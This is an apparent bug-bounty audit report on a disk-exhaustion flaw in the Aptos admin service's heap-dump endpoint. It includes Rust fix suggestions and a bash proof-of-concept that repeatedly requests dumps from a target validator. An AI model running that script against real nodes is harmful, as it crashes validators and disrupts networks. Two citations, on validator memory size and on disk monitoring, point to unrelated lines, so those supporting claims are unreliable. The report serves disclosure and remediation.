# Audit Report

## Title
Disk Exhaustion via Unbounded Heap Profile Dumps in Admin Service

## Summary
The admin service's `/malloc/dump_profile` endpoint allows authenticated users (or unauthenticated users on testnet/devnet) to repeatedly dump heap profiles to `/tmp` without any rate limiting, concurrency protection, size limits, or cleanup mechanisms. This enables an attacker to exhaust disk space and crash validator nodes.

## Finding Description

The `dump_heap_profile()` function in the admin service writes jemalloc heap profiles to disk without implementing critical resource protection mechanisms. [1](#0-0) 

Each invocation creates a new file at `/tmp/heap-profile.{timestamp}` with millisecond-precision timestamps, ensuring unique filenames that accumulate without cleanup. [2](#0-1) 

The endpoint is exposed via HTTP GET at `/malloc/dump_profile` and requires authentication only if configured. [3](#0-2) 

**Critical Security Gaps:**

1. **No Rate Limiting**: The admin service performs authentication checks but implements no rate limiting on any endpoints. [4](#0-3) 

2. **No Concurrency Protection**: Unlike the CPU profiling endpoint which uses a mutex to prevent concurrent profiling operations, the heap dump endpoint has no such protection. [5](#0-4) [6](#0-5) 

3. **Weak Default Authentication**: The default configuration has an empty `authentication_configs` array, allowing unauthenticated access on testnet/devnet. [7](#0-6) [8](#0-7) 

4. **No Cleanup Mechanism**: Files accumulate indefinitely in `/tmp` with no automated cleanup, rotation, or size limits.

5. **Large File Sizes**: Validators run with approximately 60GB of memory in production deployments. [9](#0-8)  Heap profiles can be multiple gigabytes in size, making disk exhaustion rapid and practical.

**Attack Scenario:**

On testnet/devnet where authentication is not required by default, an attacker can:
1. Discover the admin service port (default 9102) [10](#0-9) 
2. Repeatedly call `GET http://VALIDATOR_IP:9102/malloc/dump_profile`
3. Generate dozens of multi-GB heap profile files in `/tmp`
4. Exhaust disk space causing node crashes

Even on mainnet where authentication is enforced, a compromised passcode enables the same attack. [11](#0-10) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program criteria for "Validator node slowdowns" and "API crashes". 

**Direct Impacts:**
- **Validator Availability Loss**: Disk exhaustion causes the validator node process to crash when it can no longer write to disk (database writes, logs, etc.)
- **Network Liveness Degradation**: If multiple validators are targeted simultaneously, the network could lose consensus quorum temporarily
- **Service Disruption**: The admin service itself and other services relying on `/tmp` will fail

**Secondary Impacts:**
- Node operators must manually intervene to restore service
- Potential slashing penalties for downtime
- Loss of staking rewards during downtime
- Reputation damage to affected validators

While disk monitoring and alerting exist [12](#0-11) , these are reactive measures that detect but do not prevent the attack.

## Likelihood Explanation

**Likelihood: Medium to High**

**Factors Increasing Likelihood:**
- Default configuration on testnet/devnet requires no authentication
- Admin service is auto-enabled on non-mainnet networks [13](#0-12) 
- Attack requires only HTTP GET requests (no complex exploitation)
- No existing detection or prevention mechanisms specific to this endpoint
- Testnet/devnet validators are publicly accessible and used for testing/development

**Factors Decreasing Likelihood:**
- On mainnet, authentication is mandatory
- Admin service may be firewalled or not publicly exposed on some deployments
- Operators monitoring disk space would detect the attack (though not prevent it)

The vulnerability is particularly concerning because testnet/devnet validators are commonly used for integration testing and development, making them attractive targets for disruption or testing attack techniques.

## Recommendation

Implement multiple layers of defense:

**1. Add Concurrency Protection (Immediate Fix):**
```rust
// In crates/aptos-admin-service/src/server/malloc.rs
use lazy_static::lazy_static;
use async_mutex::Mutex;

lazy_static! {
    static ref HEAP_DUMP_MUTEX: Mutex<()> = Mutex::new(());
}

pub async fn handle_dump_profile_request() -> hyper::Result<Response<Body>> {
    let lock = HEAP_DUMP_MUTEX.try_lock();
    if lock.is_none() {
        return Ok(reply_with_status(
            StatusCode::TOO_MANY_REQUESTS,
            "A heap dump is already in progress.",
        ));
    }
    
    match dump_heap_profile() {
        // ... existing code
    }
}
```

**2. Add Rate Limiting:**
Integrate the existing `aptos-rate-limiter` crate to limit requests per IP/per time window (e.g., 1 request per 5 minutes).

**3. Implement File Rotation:**
- Limit the number of heap profile files (e.g., keep only the 5 most recent)
- Delete old files before creating new ones
- Implement a configurable disk space threshold check

**4. Add Size Monitoring:**
- Check available disk space before dumping
- Reject dumps if free space is below threshold (e.g., < 10GB free)

**5. Enforce Authentication by Default:**
Consider requiring authentication even on testnet/devnet, or at minimum emit prominent warnings when authentication is disabled.

## Proof of Concept

**Bash Script to Demonstrate Disk Exhaustion:**

```bash
#!/bin/bash
# PoC: Disk Exhaustion via Heap Profile Dumps
# Target: Testnet/Devnet validator with default admin service config

VALIDATOR_IP="<target-validator-ip>"
ADMIN_PORT="9102"
ENDPOINT="http://${VALIDATOR_IP}:${ADMIN_PORT}/malloc/dump_profile"

echo "[*] Starting disk exhaustion attack on ${VALIDATOR_IP}"
echo "[*] Target endpoint: ${ENDPOINT}"
echo ""

# Monitor disk space before attack
echo "[*] Initial /tmp disk usage:"
ssh validator@${VALIDATOR_IP} "df -h /tmp"
echo ""

# Launch repeated heap dumps
echo "[*] Launching repeated heap dump requests..."
for i in {1..100}; do
    response=$(curl -s -w "\n%{http_code}" "${ENDPOINT}")
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    if [ "$http_code" -eq 200 ]; then
        echo "[+] Dump $i: SUCCESS - $body"
    else
        echo "[-] Dump $i: FAILED - HTTP $http_code"
    fi
    
    # Small delay to allow writes to complete
    sleep 0.1
    
    # Check disk space every 10 dumps
    if [ $((i % 10)) -eq 0 ]; then
        echo ""
        echo "[*] Current /tmp disk usage after $i dumps:"
        ssh validator@${VALIDATOR_IP} "df -h /tmp && ls -lh /tmp/heap-profile.* | tail -n 5"
        echo ""
    fi
done

echo ""
echo "[*] Attack complete. Final disk state:"
ssh validator@${VALIDATOR_IP} "df -h /tmp && echo '' && ls -lh /tmp/heap-profile.* | wc -l"
echo "[*] Check if validator node is still responsive..."
```

**Expected Results:**
- Each request creates a new multi-GB file in `/tmp`
- After sufficient requests (dependent on available disk space), `/tmp` fills up
- Node crashes or becomes unresponsive when disk is full
- Manual intervention required to restore service

## Notes

This vulnerability represents a systemic failure to implement resource protection for an administrative debugging endpoint. The contrast with the CPU profiling endpoint (which has proper mutex protection) indicates this may have been an oversight rather than a design decision. The issue is particularly severe because:

1. The admin service is designed for operational diagnostics but lacks operational safety guards
2. Default configurations favor convenience over security on non-mainnet networks
3. The impact scales with validator memory usage (larger validators are more vulnerable)
4. No automated recovery mechanism exists once disk exhaustion occurs

Organizations running Aptos validators should immediately review their admin service configurations, implement firewall rules restricting access, and enable authentication even on test networks until this vulnerability is patched.

### Citations

**File:** crates/aptos-admin-service/src/server/malloc.rs (L12-12)
```rust
const PROFILE_PATH_PREFIX: &str = "/tmp/heap-profile";
```

**File:** crates/aptos-admin-service/src/server/malloc.rs (L46-63)
```rust
fn dump_heap_profile() -> anyhow::Result<String> {
    let _ = jemalloc_ctl::epoch::advance();

    let key = b"prof.dump\0";
    let path = format!(
        "{}.{}",
        PROFILE_PATH_PREFIX,
        SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)?
            .as_millis()
    );
    let value = CString::new(path.clone())?;
    unsafe {
        jemalloc_ctl::raw::write(key, value.as_ptr())
            .map_err(|e| anyhow::anyhow!("prof.dump error: {e}"))?;
    }
    Ok(path)
}
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-181)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
            for authentication_config in &context.config.authentication_configs {
                match authentication_config {
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
                }
            }
        };

        if !authenticated {
            return Ok(reply_with_status(
                StatusCode::NETWORK_AUTHENTICATION_REQUIRED,
                format!("{} endpoint requires authentication.", req.uri().path()),
            ));
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L193-193)
```rust
            (hyper::Method::GET, "/malloc/dump_profile") => malloc::handle_dump_profile_request(),
```

**File:** crates/aptos-system-utils/src/profiling.rs (L16-16)
```rust
    static ref CPU_PROFILE_MUTEX: Mutex<()> = Mutex::new(());
```

**File:** crates/aptos-system-utils/src/profiling.rs (L91-92)
```rust
    let lock = CPU_PROFILE_MUTEX.try_lock();
    ensure!(lock.is_some(), "A profiling task is already running.");
```

**File:** config/src/config/admin_service_config.rs (L21-21)
```rust
    // If empty, will allow all requests without authentication. (Not allowed on mainnet.)
```

**File:** config/src/config/admin_service_config.rs (L46-46)
```rust
            port: 9102,
```

**File:** config/src/config/admin_service_config.rs (L47-47)
```rust
            authentication_configs: vec![],
```

**File:** config/src/config/admin_service_config.rs (L69-76)
```rust
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
```

**File:** config/src/config/admin_service_config.rs (L94-100)
```rust
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);
```

**File:** terraform/helm/aptos-node/values.yaml (L60-60)
```yaml
  # -- Internal: name of your validator for use in labels
```

**File:** crates/node-resource-metrics/src/collectors/disk_metrics_collector.rs (L1-1)
```rust
// Copyright (c) Aptos Foundation
```
